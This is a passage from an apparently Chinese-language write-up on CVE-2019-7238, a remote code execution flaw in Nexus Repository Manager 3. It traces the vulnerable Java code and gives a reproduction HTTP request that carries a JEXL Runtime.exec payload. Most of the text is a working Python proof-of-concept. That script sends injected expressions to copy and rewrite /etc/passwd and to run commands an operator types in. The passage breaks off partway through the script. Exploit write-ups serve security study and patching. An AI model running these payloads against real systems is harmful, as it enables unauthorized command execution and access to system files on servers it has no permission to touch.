<span class="w">    </span><span class="n">selectorConfiguration</span><span class="o">.</span><span class="n">setAttributes</span><span class="p">(</span><span class="n">ImmutableMap</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="s2">&quot;expression&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">));</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">JexlSelector</span><span class="o">.</span><span class="n">TYPE</span><span class="w"> </span><span class="err">是常量</span><span class="w"> </span><span class="err">定义为</span><span class="w"> </span><span class="s1">&#39;jexl&#39;</span>
<span class="w">    </span><span class="n">selectorConfiguration</span><span class="o">.</span><span class="n">setType</span><span class="p">(</span><span class="n">JexlSelector</span><span class="o">.</span><span class="n">TYPE</span><span class="p">);</span>
<span class="w">    </span><span class="n">selectorConfiguration</span><span class="o">.</span><span class="n">setName</span><span class="p">(</span><span class="s2">&quot;preview&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="o">//</span><span class="w"> </span><span class="err">解析表达式</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">selectorManager</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">selectorConfiguration</span><span class="p">,</span><span class="w"> </span><span class="n">variableSource</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">SelectorEvaluationException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nb">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Unable to evaluate expression {}.&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>

<p><code>selectorConfiguration</code>保存要生成的表达式config。<code>jexlExpression</code>即前面传入的参数。跟入<code>selectorManager.evaluate</code>，在
components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156
，最终执行了表达式</p>
<div class="codehilite"><pre><span></span><code><span class="err">@</span><span class="n">Override</span>
<span class="w">  </span><span class="err">@</span><span class="n">Guarded</span><span class="p">(</span><span class="n">by</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">STARTED</span><span class="p">)</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">boolean</span><span class="w"> </span><span class="n">evaluate</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">SelectorConfiguration</span><span class="w"> </span><span class="n">selectorConfiguration</span><span class="p">,</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">VariableSource</span><span class="w"> </span><span class="n">variableSource</span><span class="p">)</span>
<span class="w">      </span><span class="n">throws</span><span class="w"> </span><span class="n">SelectorEvaluationException</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="err">根据传入的</span><span class="w"> </span><span class="n">selectorConfiguration</span><span class="w"> </span><span class="err">生成对应的</span><span class="w"> </span><span class="n">selector</span><span class="w"> </span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="err">前面指定了</span><span class="w"> </span><span class="n">JexlSelector</span><span class="o">.</span><span class="n">TYPE</span><span class="w"> </span><span class="err">，这里将生成</span><span class="w"> </span><span class="n">JexlSelector</span>
<span class="w">    </span><span class="n">Selector</span><span class="w"> </span><span class="n">selector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createSelector</span><span class="p">(</span><span class="n">selectorConfiguration</span><span class="p">);</span>

<span class="w">    </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="o">//</span><span class="w"> </span><span class="err">调用</span><span class="w"> </span><span class="n">selector</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">evaluate</span><span class="w"> </span><span class="err">方法</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">selector</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">variableSource</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">SelectorEvaluationException</span><span class="p">(</span><span class="s2">&quot;Selector &#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">selectorConfiguration</span><span class="o">.</span><span class="n">getName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&#39; evaluation in error&quot;</span><span class="p">,</span>
<span class="w">          </span><span class="n">e</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
</code></pre></div>

<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>参考官方文档：<a href="https://help.sonatype.com/repomanager3/configuration/repository-management">https://help.sonatype.com/repomanager3/configuration/repository-management</a>#RepositoryManagement-CreatingaQuery</p>
<p>其对应接口位置如下图<img alt="3.jpeg" src="../resource/%28CVE-2019-7238%29NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId26.jpg" />如果是新搭建的环境，为复现成功，还需要先往现有的Repository添加asset。这样在查询确实存在asset后，才会进一步根据<code>whereClause</code>对查询结果asset进行筛选，也才会对<code>whereClause</code>进行表达式解析。不过在实际环境中，Repository中早就各种asset了。下面随便选了一个logging.jar上传。<img alt="4.jpeg" src="../resource/%28CVE-2019-7238%29NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.jpg" /></p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/service/extdirect</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span><span class="l">www.0-sec.org:8081</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">308</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:[{</span><span class="nt">&quot;page&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&quot;start&quot;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&quot;limit&quot;</span><span class="p">:</span><span class="mi">25</span><span class="p">,</span><span class="nt">&quot;filter&quot;</span><span class="p">:[{</span><span class="nt">&quot;property&quot;</span><span class="p">:</span><span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="s2">&quot;*&quot;</span><span class="p">},{</span><span class="nt">&quot;property&quot;</span><span class="p">:</span><span class="s2">&quot;expression&quot;</span><span class="p">,</span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="s2">&quot;&#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;calc.exe&#39;)&quot;</span><span class="p">},{</span><span class="nt">&quot;property&quot;</span><span class="p">:</span><span class="s2">&quot;type&quot;</span><span class="p">,</span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="s2">&quot;jexl&quot;</span><span class="p">}]}],</span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="s2">&quot;rpc&quot;</span><span class="p">,</span><span class="nt">&quot;tid&quot;</span><span class="p">:</span><span class="mi">4</span><span class="p">}</span>
</code></pre></div>

<p><img alt="1.png" src="../resource/%28CVE-2019-7238%29NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png" /></p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code>cve-2019-7238.py
</code></pre></div>

<p><img alt="2.png" src="../resource/%28CVE-2019-7238%29NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png" /></p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">requests.packages.urllib3.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Nexus Repository Manager 3 Remote Code Execution - CVE-2019-7238 </span><span class="se">\n</span><span class="s2">Found by @Rico and @voidfyoo</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span>
<span class="p">}</span>

<span class="n">remote</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8081&#39;</span>

<span class="n">ARCH</span><span class="o">=</span><span class="s2">&quot;LINUX&quot;</span>
<span class="c1"># ARCH=&quot;WIN&quot;</span>

<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">json_data</span><span class="p">[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;total&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;OK&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;KO&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Error status code&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>


<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if Content-Selectors exist =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
<span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
<span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
<span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==1&quot;</span><span class="p">},</span> <span class="p">{</span>
    <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span>
              <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">ARCH</span> <span class="o">==</span> <span class="s2">&quot;LINUX&quot;</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;command (not reflected)&gt; &quot;</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
            <span class="n">command_str</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
            <span class="n">command_str</span> <span class="o">=</span> <span class="n">command_str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Copy file to temp directory =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>

            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">cp /etc/passwd  /tmp/passwd</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Preparing temp file =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">sed -i 1cpwn2  /tmp/passwd</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Cleaning temp file =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">sed -i /[^pwn2]/d /tmp/passwd</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Writing command into temp file =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">sed -i 1s/pwn2/{echo,&quot;</span> <span class="o">+</span> <span class="n">command_str</span> <span class="o">+</span> <span class="s2">&quot;}|{base64,-d}&gt;pwn.txt/g /tmp/passwd</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
